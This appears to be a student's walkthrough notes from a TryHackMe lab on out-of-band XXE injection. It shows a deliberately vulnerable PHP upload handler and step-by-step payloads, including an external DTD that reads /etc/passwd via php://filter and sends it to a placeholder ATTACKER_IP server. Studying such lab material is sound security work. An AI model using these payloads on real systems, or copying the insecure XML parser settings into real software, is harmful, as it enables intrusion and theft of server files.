```php
libxml_disable_entity_loader(false);
$xmlData = file_get_contents('php://input'); 

$doc = new DOMDocument();
$doc->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD);

$links = $doc->getElementsByTagName('file');

foreach ($links as $link) {
    $fileLink = $link->nodeValue;
    $stmt = $conn->prepare("INSERT INTO uploads (link, uploaded_date) VALUES (?, NOW())");
    $stmt->bind_param("s", $fileLink);
    $stmt->execute();
    
    if ($stmt->affected_rows > 0) {
        echo "Link saved successfully.";
    } else {
        echo "Error saving link.";
    }
    
    $stmt->close();
}
```

The code above doesn't return the values of the submitted XML data. Hence, the term Out-of-Band since the exfiltrated data has to be captured using an attacker-controlled server. You can use Python's http.server module, although there are options out there, like Apache or Nginx.
```shell-session
user@tryhack $ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
```

Upload a file in the application and monitor the request that is sent to `submit.php` using your Burp. Forward the request below to Burp Repeater.
	![](Pasted%20image%2020241220120014.png)

Using the payload below, replace the value of the XML file in the request and resend it.
```shell
<!DOCTYPE foo [<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://{ATTACKER_IP}:1337/" >]>
<upload>
	<file>
		&xxe;
	</file>
</upload>
```

![](Pasted%20image%2020241220120112.png)

After sending the modified HTTP request, the Python web server will receive a connection from the target machine. The establishment of a connection with the server indicates that sensitive information can be extracted from the application.
	![](Pasted%20image%2020241220120129.png)

We can now create a DTD file that contains an external entity with a PHP filter to exfiltrate data from the target web application.

Save the sample DTD file below and name it as `sample.dtd`. The payload below will exfiltrate the contents of `/etc/passwd` and send the response back to the attacker-controlled server:
```shell
<!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>">
%oobxxe;
```

## **DTD Payload Explained**
The DTD begins with a declaration of an entity `%cmd` that points to a system resource. The **`%cmd`** entity refers to a resource within the PHP filter protocol `php://filter/convert.base64-encode/resource=/etc/passwd`.
	  The **`%oobxxe`** entity contains another XML entity declaration, `exfil`, which has a system identifier pointing to the attacker-controlled server. It includes a parameter named data with `%cmd`, representing the Base64-encoded content of `/etc/passwd`. When `%oobxxe;` is parsed, it creates the `exfil` entity that connects to an attacker's server (`http://ATTACKER_IP:1337/`). The parameter `?data=%cmd` sends the Base64-encoded content from `%cmd`.

Go back to the repeater and change your payload to:
```shell
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE uploadDTD SYSTEM "http://ATTACKER_IP:1337/sample.dtd">
<upload>
    <file>
	    &exfil;
	</file>
</upload>
```
which means
```shell
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE upload [
  <!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  <!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>">
  %oobxxe;
]>
<upload>
	<file>
	  &exfil;
	</file>
</upload>
```
stack is:
```shell
[
  upload,
  %cmd,
  %oobxxe,
  exfil -> SYSTEM 'http://...data=php://filter...'
]
```

![](Pasted%20image%2020241220120911.png)

Resend the request and check your terminal. You will receive two (2) requests. The first is the request for the sample.dtd file, and the second is the request sent by the vulnerable application containing the encoded /etc/passwd.
	![](Pasted%20image%2020241220120930.png)
Decoding the exfiltrated base64 data will show that it contains the base64 value of /etc/passwd.
	![](Pasted%20image%2020241220120950.png)


